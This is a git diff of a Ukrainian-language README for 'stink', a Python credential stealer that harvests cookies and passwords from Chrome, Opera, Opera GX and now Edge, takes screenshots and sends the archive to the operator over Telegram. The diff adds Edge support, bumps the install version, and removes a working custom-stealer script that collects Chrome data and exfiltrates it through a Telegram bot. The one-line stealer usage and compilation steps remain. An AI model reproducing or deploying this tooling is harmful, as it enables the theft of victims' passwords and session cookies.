@@ -13,7 +13,6 @@
 * [Встановлення](#Встановлення)
 * [Приклад використання](#Приклад-використання)
   * [Стандартний](#Стандартний)
-  * [Кастомний](#Кастомний)
 * [Налаштування Telegram бота](#Налаштування-Telegram-бота)
   * [Отримання токена](#Отримання-токена)
   * [Отримання айді](#Отримання-айді)
@@ -22,7 +21,7 @@
   * [CMD](#CMD)
 
 ### Поточні можливості
-1. Збір кукі та паролів наступних браузерів: Chrome, Opera, Opera GX.
+1. Збір кукі та паролів наступних браузерів: Chrome, Opera, Opera GX, Microsoft Edge.
 2. Відправлення зібраних даних архівом в Telegram.
 3. Виконання в окремому потоці.
 4. Скріншот екрану.
@@ -36,7 +35,7 @@
 
 Встановити останню версію можна командою:
 ```
-pip install stink==0.0.5
+pip install stink==0.0.6
 ```
 
 ## Приклад використання
@@ -49,34 +48,6 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 Для включення виводу помилок додайте параметр `errors=True`.
 
 Стандартний ```Stealer``` запускає збір з усіх доступних браузерів і відправляє зібрані дані архівом вам в Telegram.
-
-### Кастомний
-```python
-from os import mkdir
-from getpass import getuser
-
-from stink.browsers.chrome import Chrome
-from stink.modules.sender import Sender
-
-user = getuser()
-
-zip_name = f"{user}-st"
-storage_path = f"C:/Users/{user}/AppData/"
-storage_folder = "files/"
-
-
-def main():
-
-    mkdir(storage_path + storage_folder)
-
-    Chrome(storage_path, storage_folder, False).run()
-    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID, False).run()
-
-
-if __name__ == "__main__":
-    main()
-```
-В кастомному стіллері потрібно самому прописувати необхідні браузери і шлях для зберігання зібраних даних. Модуль ```Sender``` запакує всі файли в архів і відправить його вам в Telegram.
 
 ## Налаштування Telegram бота
 ### Отримання токена
@@ -146,7 +117,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.5
+pip install stink==0.0.6
 ```
 6. У створеній папці venv переходимо по шляху `\Lib\site-packages\win32\`.
 7. Копіюємо файл `win32crypt.pyd`.
